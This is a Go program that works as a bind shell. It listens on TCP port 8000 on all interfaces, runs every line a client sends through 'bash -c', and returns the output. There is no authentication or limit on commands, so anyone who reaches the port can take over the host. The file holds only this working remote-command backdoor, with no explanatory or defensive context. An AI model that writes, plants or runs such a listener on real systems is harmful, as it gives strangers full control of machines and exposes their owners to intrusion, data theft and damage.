package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	for {
		cmdStr, err := reader.ReadString('\n')
		if err == io.EOF {
			log.Println("Connection closed.")
			return
		} else if err != nil {
			log.Println("Read error:", err)
			return
		}

		cmdStr = cmdStr[:len(cmdStr)-1] // Remove newline
		log.Println("Executing:", cmdStr)

		cmd := exec.Command("bash", "-c", cmdStr)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nError: "+err.Error())...)
		}

		conn.Write(output)
		conn.Write([]byte("\n")) // End with newline
	}
}

func main() {
	listener, err := net.Listen("tcp", ":8000")
	if err != nil {
		log.Fatal("Failed to listen:", err)
	}
	log.Println("Listening on port 8000...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Connection error:", err)
			continue
		}
		go handleConnection(conn)
	}
}
